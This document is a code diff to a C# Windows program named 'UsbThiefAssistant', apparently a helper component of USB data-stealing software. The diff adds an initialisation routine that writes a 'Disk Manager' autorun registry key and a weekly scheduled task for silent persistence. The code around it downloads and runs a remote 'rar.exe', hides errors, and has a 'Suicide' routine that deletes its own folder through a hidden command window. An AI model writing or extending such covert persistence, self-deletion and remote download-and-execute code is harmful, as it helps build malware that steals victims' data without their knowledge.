@@ -13,6 +13,7 @@ namespace UsbThiefAssistant
 {
     public partial class Form1 : Form
     {
+        public string path = Application.StartupPath;
         public Form1()
         {
             string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
@@ -20,6 +21,9 @@ namespace UsbThiefAssistant
                 Environment.Exit(0);
             switch (args[1])
             {
+                case "-init":
+                    Init();
+                    break;
                 case "-kill":
                     KillProcess();
                     break;
@@ -67,7 +71,7 @@ namespace UsbThiefAssistant
             {
             }
         }
-        public void DeleteFolder(string folderPath)
+        private void DeleteFolder(string folderPath)
         {
             try
             {
@@ -124,7 +128,7 @@ namespace UsbThiefAssistant
         {
             try
             {
-                HttpWebRequest Myrq = (HttpWebRequest)HttpWebRequest.Create(URL);
+                HttpWebRequest Myrq = (HttpWebRequest)WebRequest.Create(URL);
                 HttpWebResponse myrp = (HttpWebResponse)Myrq.GetResponse();
                 Stream st = myrp.GetResponseStream();
                 Stream so = new FileStream(filename, FileMode.Create);
@@ -146,29 +150,63 @@ namespace UsbThiefAssistant
                 return false;
             }
         }
-        private void Clean()
+        private void Init()
         {
-            string path = Application.StartupPath + @"\data\diskcache\files\";
-            KillProcess();
-            DeleteFolder(path);
             try
             {
-                if (File.Exists(Application.StartupPath + "\\status"))
-                    File.Delete(Application.StartupPath + "\\status");
-                if (File.Exists(Application.StartupPath + "\\log"))
-                    File.Delete(Application.StartupPath + "\\log");
+                if (File.Exists(path + "\\rar.exe"))
+                    File.Delete(path + "\\rar.exe");
             }
             catch (Exception)
             {
             }
-            Process.Start(Application.StartupPath + "\\diskmanager.exe", "-run");
+            try
+            {
+                RegistryKey rk = Registry.CurrentUser;
+                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
+                if (rk2.GetValue("Disk Manager") == null || rk2.GetValue("Disk Manager").ToString() != "\"" + path + "\\diskmanager.exe\" -run")
+                {
+                    rk2.SetValue("Disk Manager", "\"" + path + "\\diskmanager.exe\" -run");
+                }
+                rk2.Close();
+                rk.Close();
+            }
+            catch (Exception)
+            {
+            }
+            try
+            {
+                if (TaskService.Instance.FindTask("Clean Files") == null || TaskService.Instance.FindTask("Clean Files").Definition.Actions[0].ToString() != "\"" + path + "\\fileassistant.exe\" -clean")
+                {
+                    TaskService.Instance.AddTask("Clean Files", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = "\"" + path + "\\fileassistant.exe\"", Arguments = "-clean" });
+                }
+            }
+            catch (Exception)
+            {
+            }
+            Environment.Exit(0);
+        }
+        private void Clean()
+        {
+            KillProcess();
+            DeleteFolder(path + @"\data\diskcache\files\");
+            try
+            {
+                if (File.Exists(path + "\\status"))
+                    File.Delete(path + "\\status");
+                if (File.Exists(path + "\\log"))
+                    File.Delete(path + "\\log");
+            }
+            catch (Exception)
+            {
+            }
+            Process.Start(path + "\\diskmanager.exe", "-run");
             Environment.Exit(0);
         }
         private void Suicide()
         {
             try
             {
-                string p = Application.ExecutablePath;
                 RegistryKey rk = Registry.CurrentUser;
                 RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                 if (rk2.GetValue("Disk Manager") != null)
@@ -188,9 +226,8 @@ namespace UsbThiefAssistant
             catch (Exception)
             {
             }
-            string path = Application.StartupPath;
             KillProcess();
-            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C Timeout /T 5 & Rd /S /Q " + path)
+            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C Timeout /T 5 & Rd /S /Q " + "\"" + path + "\"")
             {
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true
@@ -206,10 +243,10 @@ namespace UsbThiefAssistant
             if (regex.IsMatch(addr))
             {
 
-                DownloadFile(addr, Application.StartupPath + "\\rar.exe");
+                DownloadFile(addr, path + "\\rar.exe");
                 try
                 {
-                    Process.Start(Application.StartupPath + "\\rar.exe");
+                    Process.Start(path + "\\rar.exe");
                 }
                 catch (Exception)
                 {
